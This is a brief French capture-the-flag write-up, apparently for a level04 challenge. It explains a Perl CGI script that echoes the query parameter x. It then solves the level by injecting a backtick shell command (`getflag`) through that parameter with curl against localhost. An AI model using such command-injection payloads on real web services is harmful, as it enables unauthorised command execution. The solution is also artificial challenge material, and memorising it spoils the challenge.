Quand on se log on a un script perl qui s'appelle level04.pl

Voici une version simplifié de ce script:

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
print param("x");

Un script CGI va est typiquement exécuté par un web server pour produire une page html dynamiquement. 
Le corps de la requête est piped vers l'entrée standard du programme et la query string dans la variable
d'env QUERY_STRING. Le script utilise un module CGI qui lui permet de parser et stocker toute ces informations.
Donc print param("x") print la valeur du query parameter x

On peut tester avec curl à l'interface donné dans le commentaire du script:

curl localhost:4747?x=bonjour

bonjour

On a vu que le script original, perl comprend la syntaxe même syntaxe que bash avec les backticks qui
permet de récupérer l'output d'une commande. 
Exemple :

echo "Today we are" `date`

Comme on est très malin on met getflag en argument

curl 'localhost:4747?x=`getflag`' #On oublie pas d'utiliser les single quotes pour pas que ce soit bash qui fasse la substition

Bingo
